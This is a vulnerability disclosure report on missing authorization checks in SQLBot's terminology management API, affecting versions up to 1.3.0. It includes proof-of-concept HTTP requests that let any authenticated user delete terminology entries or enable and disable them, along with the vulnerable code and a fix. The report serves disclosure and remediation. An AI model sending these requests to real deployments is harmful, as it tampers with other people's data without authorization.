# Missing Authorization in Terminology Management APIs

## 1. Vulnerability Title
Missing Authorization Check in Terminology Management APIs of SQLBot

## 2. Product Details
* **Vendor:** DataEase / FIT2CLOUD
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains missing authorization vulnerabilities in the Terminology Management APIs, allowing any authenticated user to delete terminology entries and enable/disable terminology records without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - Delete any terminology entries, affecting system's natural language understanding
  - Enable or disable terminology records, disrupting query interpretation
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 7. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: Delete Terminology (DELETE /system/terminology)

```http
DELETE /api/v1/system/terminology HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

[1, 2, 3]
```

**Result:** Deletes terminology entries without authorization check.

### PoC 2: Enable/Disable Terminology (GET /system/terminology/{id}/enable/{enabled})

```http
GET /api/v1/system/terminology/1/enable/false HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Disables terminology entry without authorization check.

```http
GET /api/v1/system/terminology/1/enable/true HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Enables terminology entry without authorization check.

## 8. Vulnerable Code Location

**File:** `backend/apps/terminology/api/terminology.py`

| Endpoint | Method | Lines | Description |
|----------|--------|-------|-------------|
| /system/terminology | DELETE | 37-39 | Delete terminology |
| /system/terminology/{id}/enable/{enabled} | GET | 42-44 | Enable/disable terminology |

### Vulnerable Code: Delete Terminology (Lines 37-39)

```python
@router.delete("")
async def delete(session: SessionDep, id_list: list[int]):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    delete_terminology(session, id_list)
```

### Vulnerable Code: Enable/Disable Terminology (Lines 42-44)

```python
@router.get("/{id}/enable/{enabled}")
async def enable(session: SessionDep, id: int, enabled: bool, trans: Trans):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    enable_terminology(session, id, enabled, trans)
```

## 9. Remediation

Add proper authorization checks to all affected endpoints:

```python
from common.core.deps import CurrentUser

@router.delete("")
async def delete(session: SessionDep, current_user: CurrentUser, trans: Trans, id_list: list[int]):
    if not current_user.isAdmin and current_user.weight == 0:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # Verify ownership of terminology data
    delete_terminology(session, id_list, current_user.oid)

@router.get("/{id}/enable/{enabled}")
async def enable(session: SessionDep, current_user: CurrentUser, id: int, enabled: bool, trans: Trans):
    if not current_user.isAdmin and current_user.weight == 0:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    # Verify ownership
    enable_terminology(session, id, enabled, trans, current_user.oid)
```

## 10. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /system/terminology | DELETE | High | Delete terminology entries |
| /system/terminology/{id}/enable/{enabled} | GET | Medium | Enable/disable terminology |
